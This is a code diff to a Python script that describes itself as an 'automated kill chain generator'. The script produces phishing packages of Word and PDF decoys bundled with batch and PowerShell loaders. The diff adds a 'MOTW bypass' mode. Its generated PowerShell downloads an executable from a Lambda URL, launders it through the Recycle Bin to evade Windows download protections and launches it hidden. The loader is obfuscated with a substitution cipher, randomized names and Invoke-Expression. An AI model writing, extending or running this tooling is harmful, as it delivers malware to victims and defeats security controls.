@@ -4,11 +4,12 @@ exam-gen: Automated kill chain generator for Linux.
 Produces unique Word (.zip) and PDF (.zip) packages per variant folder.
 
 Config via environment variables (or .env file next to this script):
-  LAMBDA_URL       — Lambda Function URL for payload delivery
-  API_KEY          — X-Api-Key header value
-  TARGET_FILENAME  — Downloaded file name on victim (default: cat.exe)
-  VARIANTS_DIR     — Path to variant folders (default: ./variants)
-  OUTPUT_DIR       — Path for output ZIPs     (default: ./output)
+  LAMBDA_URL        — Lambda Function URL for payload delivery
+  API_KEY           — X-Api-Key header value
+  TARGET_FILENAME   — Downloaded file name on victim (default: cat.exe)
+  VARIANTS_DIR      — Path to variant folders (default: ./variants)
+  OUTPUT_DIR        — Path for output ZIPs     (default: ./output)
+  DELIVERY_METHOD   — webclient (default) or base64_recycle (MOTW bypass)
 """
 
 import base64
@@ -58,11 +59,12 @@ def _load_dotenv():
 
 _load_dotenv()
 
-LAMBDA_URL      = os.environ.get('LAMBDA_URL', '')
-API_KEY         = os.environ.get('API_KEY', '')
-TARGET_FILENAME = os.environ.get('TARGET_FILENAME', 'cat.exe')
-VARIANTS_DIR    = os.environ.get('VARIANTS_DIR', './variants')
-OUTPUT_DIR      = os.environ.get('OUTPUT_DIR', './output')
+LAMBDA_URL       = os.environ.get('LAMBDA_URL', '')
+API_KEY          = os.environ.get('API_KEY', '')
+TARGET_FILENAME  = os.environ.get('TARGET_FILENAME', 'cat.exe')
+VARIANTS_DIR     = os.environ.get('VARIANTS_DIR', './variants')
+OUTPUT_DIR       = os.environ.get('OUTPUT_DIR', './output')
+DELIVERY_METHOD  = os.environ.get('DELIVERY_METHOD', 'webclient')  # webclient | base64_recycle
 
 # ====================================================================
 #  CONSTANTS
@@ -221,6 +223,125 @@ def generate_ps1(encrypt_map, decrypt_map):
 
     # ── build the decryption map block ──
     # { and } go to end to avoid @{} block breakage
+    normal_entries = []
+    special_entries = []
+    for code, ch in decrypt_map.items():
+        entry = f"'{code}'='{ch}'"
+        if ch in '{}':
+            special_entries.append(entry)
+        else:
+            normal_entries.append(entry)
+    all_entries = normal_entries + special_entries
+
+    map_lines = []
+    for i in range(0, len(all_entries), 10):
+        chunk = all_entries[i:i + 10]
+        map_lines.append('    ' + '; '.join(chunk) + '; ')
+    map_block = '\n'.join(map_lines)
+
+    # ── assemble final artifact ──
+    artifact = (
+        f"${var_url} = '{b64_url}'\n"
+        f"${var_filename} = '{b64_filename}'\n"
+        f"${var_enc_body} = '{encrypted_body}'\n"
+        f"\n"
+        f"${var_dec_map} = @{{\n"
+        f"{map_block}\n"
+        f"}}\n"
+        f"\n"
+        f"function {var_func} {{\n"
+        f"    param ([string]$InputString)\n"
+        f"    $result = \"\"\n"
+        f"    $i = 0\n"
+        f"    while ($i -lt $InputString.Length) {{\n"
+        f"        if ($i + 1 -lt $InputString.Length) {{\n"
+        f"            $pair = $InputString.Substring($i, 2)\n"
+        f"            if (${var_dec_map}.ContainsKey($pair)) {{\n"
+        f"                $result += ${var_dec_map}[$pair]\n"
+        f"                $i += 2\n"
+        f"                continue\n"
+        f"            }}\n"
+        f"        }}\n"
+        f"        $result += $InputString[$i]\n"
+        f"        $i++\n"
+        f"    }}\n"
+        f"    return $result\n"
+        f"}}\n"
+        f"\n"
+        f"${var_decoded_url} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_url}))\n"
+        f"${var_decoded_fn} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_filename}))\n"
+        f"${var_dec_script} = {var_func} -InputString ${var_enc_body}\n"
+        f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
+        f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
+        f"Invoke-Expression ${var_final}\n"
+    )
+    return artifact
+
+
+def generate_ps1_recycle(encrypt_map, decrypt_map):
+    """Build PS1 artifact: download via Lambda, base64 create, recycle bin MOTW bypass."""
+
+    # ── random placeholder tags ──
+    tag_url = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
+    tag_fn = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
+
+    # ── random variable names for inner template ──
+    dv1 = random_var_name()  # tempPath
+    dv2 = random_var_name()  # webClient
+    dv3 = random_var_name()  # url
+    dv4 = random_var_name()  # filename
+    dv5 = random_var_name()  # fullPath
+    dv6 = random_var_name()  # bytes
+    dv7 = random_var_name()  # b64
+    dv8 = random_var_name()  # shell
+    dv9 = random_var_name()  # rb
+
+    script_template = (
+        f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
+        f'${dv1} = [system.io.path]::gettemppath()\n'
+        f'${dv2} = new-object system.net.webclient\n'
+        f'${dv2}.headers.add("x-api-key", "{API_KEY}")\n'
+        f'${dv3} = "{tag_url}"\n'
+        f'${dv4} = "{tag_fn}"\n'
+        f'${dv5} = join-path ${dv1} ${dv4}\n'
+        f'${dv6} = ${dv2}.downloaddata(${dv3})\n'
+        f'${dv7} = [convert]::tobase64string(${dv6})\n'
+        f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))\n'
+        f'add-type -assemblyname microsoft.visualbasic\n'
+        f'[microsoft.visualbasic.fileio.filesystem]::deletefile(${dv5}, '
+        f"'OnlyErrorDialogs', 'SendToRecycleBin')\n"
+        f'start-sleep -milliseconds 800\n'
+        f'${dv8} = new-object -comobject shell.application\n'
+        f'${dv9} = ${dv8}.namespace(10)\n'
+        f'foreach ($item in ${dv9}.items()) {{\n'
+        f'  if ($item.name -eq ${dv4}) {{\n'
+        f'    ${dv8}.namespace(${dv1}).movehere($item, 0x14)\n'
+        f'    break\n'
+        f'  }}\n'
+        f'}}\n'
+        f'start-sleep -milliseconds 800\n'
+        f'start-process -filepath ${dv5} -windowstyle hidden'
+    )
+
+    # ── encode URL & filename as Base64 ──
+    b64_url = base64.b64encode(LAMBDA_URL.encode('utf-8')).decode('ascii')
+    b64_filename = base64.b64encode(TARGET_FILENAME.encode('utf-8')).decode('ascii')
+
+    # ── encrypt the template body ──
+    encrypted_body = encrypt_string(script_template, encrypt_map)
+
+    # ── random variable names for wrapper ──
+    var_url = random_var_name()
+    var_filename = random_var_name()
+    var_enc_body = random_var_name()
+    var_dec_map = random_var_name()
+    var_func = random_var_name()
+    var_decoded_url = random_var_name()
+    var_decoded_fn = random_var_name()
+    var_dec_script = random_var_name()
+    var_final = random_var_name()
+
+    # ── build decryption map block ──
     normal_entries = []
     special_entries = []
     for code, ch in decrypt_map.items():
@@ -652,8 +773,11 @@ def process_variant(variant_dir, output_dir):
         w_ps1 = random_short_name() + '.ps1'
         w_decoy = random_short_name() + '.docx'
         w_enc, w_dec = generate_cipher_map()
-        w_ps1_content = generate_ps1(w_enc, w_dec)
-        print(f'      [word] bat={w_bat}, ps1={w_ps1}, decoy={w_decoy}')
+        if DELIVERY_METHOD == 'base64_recycle':
+            w_ps1_content = generate_ps1_recycle(w_enc, w_dec)
+        else:
+            w_ps1_content = generate_ps1(w_enc, w_dec)
+        print(f'      [word] bat={w_bat}, ps1={w_ps1}, decoy={w_decoy} method={DELIVERY_METHOD}')
 
         word_pkg_dir = os.path.join(tmpdir, '_word_pkg')
         os.makedirs(word_pkg_dir)
@@ -716,8 +840,11 @@ def process_variant(variant_dir, output_dir):
         p_ps1 = random_short_name() + '.ps1'
         p_decoy = random_short_name() + '.pdf'
         p_enc, p_dec = generate_cipher_map()
-        p_ps1_content = generate_ps1(p_enc, p_dec)
-        print(f'      [pdf]  bat={p_bat}, ps1={p_ps1}, decoy={p_decoy}')
+        if DELIVERY_METHOD == 'base64_recycle':
+            p_ps1_content = generate_ps1_recycle(p_enc, p_dec)
+        else:
+            p_ps1_content = generate_ps1(p_enc, p_dec)
+        print(f'      [pdf]  bat={p_bat}, ps1={p_ps1}, decoy={p_decoy} method={DELIVERY_METHOD}')
 
         pdf_pkg_dir = os.path.join(tmpdir, '_pdf_pkg')
         os.makedirs(pdf_pkg_dir)
@@ -809,6 +936,11 @@ def main():
         print('[!] API_KEY is not set. Export it or add to .env file.')
         sys.exit(1)
 
+    if DELIVERY_METHOD not in ('webclient', 'base64_recycle'):
+        print(f'[!] Unknown DELIVERY_METHOD: {DELIVERY_METHOD}')
+        print('    Valid options: webclient, base64_recycle')
+        sys.exit(1)
+
     # Resolve paths relative to script location
     script_dir = os.path.dirname(os.path.abspath(__file__))
     variants_dir = os.path.join(script_dir, VARIANTS_DIR) if not os.path.isabs(VARIANTS_DIR) else VARIANTS_DIR
@@ -835,6 +967,7 @@ def main():
     print(f'[*] Output: {output_dir}')
     print(f'[*] Lambda URL: {LAMBDA_URL}')
     print(f'[*] Target filename: {TARGET_FILENAME}')
+    print(f'[*] Delivery method: {DELIVERY_METHOD}')
 
     for vd in variant_dirs:
         process_variant(vd, output_dir)
